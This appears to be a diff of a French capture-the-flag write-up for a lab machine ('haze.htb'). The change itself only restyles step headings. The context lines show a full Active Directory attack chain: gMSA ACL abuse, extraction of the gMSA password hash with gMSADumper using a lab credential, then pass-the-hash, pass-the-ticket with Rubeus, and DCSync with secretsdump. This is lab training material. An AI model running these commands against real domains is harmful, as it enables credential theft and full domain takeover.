@@ -33,13 +33,13 @@ Si un utilisateur possède le droit `WriteProperty` sur cet attribut, **il peut 
 
 ### <mark style="color:blue;">🔁</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Étapes d’exploitation réelles :**</mark>
 
-**1. 🎯 Enumération du droit**
+<mark style="color:green;">**1. 🎯 Enumération du droit**</mark>
 
 ```powershell
 Get-DomainObjectACL -ResolveGUIDs -Identity "Haze-IT-Backup"
 ```
 
-**2. ✍️ Ajout du compte dans les retrieveurs**
+<mark style="color:green;">**2. ✍️ Ajout du compte dans les retrieveurs**</mark>
 
 ```powershell
 $gMSA = "Haze-IT-Backup"
@@ -50,7 +50,7 @@ $new = $original + $PrincipalToAdd
 Set-ADServiceAccount -PrincipalsAllowedToRetrieveManagedPassword $new $gMSA
 ```
 
-**3. 🔓 Extraction des secrets du gMSA**
+<mark style="color:green;">**3. 🔓 Extraction des secrets du gMSA**</mark>
 
 ```bash
 python3 gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb
@@ -68,19 +68,19 @@ aes128: <AES128 key>
 
 ### <mark style="color:blue;">🧠</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Utilisation du compte gMSA :**</mark>
 
-**🔥 Pass-the-Hash**
+<mark style="color:green;">**🔥 Pass-the-Hash**</mark>
 
 ```bash
 evil-winrm -u Haze-IT-Backup$ -H <nt hash> -i <victim-ip>
 ```
 
-**🧪 Pass-the-Ticket (Rubeus)**
+<mark style="color:green;">**🧪 Pass-the-Ticket (Rubeus)**</mark>
 
 ```powershell
 Rubeus.exe asktgt /user:Haze-IT-Backup$ /rc4:<nt hash> /domain:haze.htb
 ```
 
-**🔓 DCSync (si droits élevés)**
+<mark style="color:green;">**🔓 DCSync (si droits élevés)**</mark>
 
 ```bash
 secretsdump.py haze.htb/Haze-IT-Backup$@DC01.haze.htb -hashes :<nt hash>
